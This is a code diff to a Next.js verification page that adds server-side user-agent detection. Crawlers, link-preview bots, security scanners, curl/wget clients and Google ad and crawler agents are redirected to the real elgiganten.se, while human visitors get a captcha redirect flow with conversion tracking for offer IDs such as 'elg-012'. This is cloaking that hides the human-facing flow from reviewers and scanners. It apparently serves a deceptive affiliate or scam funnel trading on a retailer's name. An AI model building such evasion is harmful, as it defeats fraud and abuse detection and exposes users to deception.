@@ -2,6 +2,8 @@ import Header from "../../components/Header";
 import Footer from "../../components/Footer";
 import CaptchaRedirectClientWrapper from "./CaptchaRedirectClientWrapper";
 import Script from "next/script";
+import { headers } from "next/headers";
+import { redirect } from "next/navigation";
 
 type PageProps = {
   searchParams?: { id?: string };
@@ -24,10 +26,24 @@ const TRACKED_OFFERS = new Set([
   "elg-012",
 ]);
 
+// Broad bot/crawler UA detection (includes Google-CloudVertexBot)
+const BOT_UA =
+  /(bot|crawler|spider|crawling|curl|wget|python-requests|httpclient|libwww|urlgrabber|^python|^php|^java|go-http-client|okhttp|feedfetcher|readability|preview|scan|probe|monitor|checker|validator|analyzer|scrape|scraper|headless|phantomjs|slimerjs|puppeteer|playwright|rendertron|facebookexternalhit|facebot|slackbot|twitterbot|linkedinbot|pinterest|discordbot|telegrambot|whatsapp|skypeuripreview|googlebot|adsbot-google|google-read-aloud|google-cloudvertexbot|mediapartners-google|bingbot|bingpreview|yandex|baiduspider|duckduckbot|sogou|seznambot|semrush|ahrefs|mj12bot|dotbot|gigabot|petalbot|applebot|ia_archiver|amazonbot)/i;
+
 export default function VerifyPage({ searchParams }: PageProps) {
   const id = (searchParams?.id || "").toLowerCase();
   const shouldFire = TRACKED_OFFERS.has(id);
 
+  // Detect bots on the server
+  const ua = headers().get("user-agent") || "";
+  const isBot = BOT_UA.test(ua);
+
+  // 🚫 Bots never touch the real redirect flow — send them to elgiganten.se
+  if (isBot) {
+    redirect("https://www.elgiganten.se");
+  }
+
+  // 🟢 Humans get normal flow (captcha + optional conversion event)
   return (
     <>
       {shouldFire && (
@@ -64,6 +80,3 @@ export default function VerifyPage({ searchParams }: PageProps) {
     </>
   );
 }
-
-
-
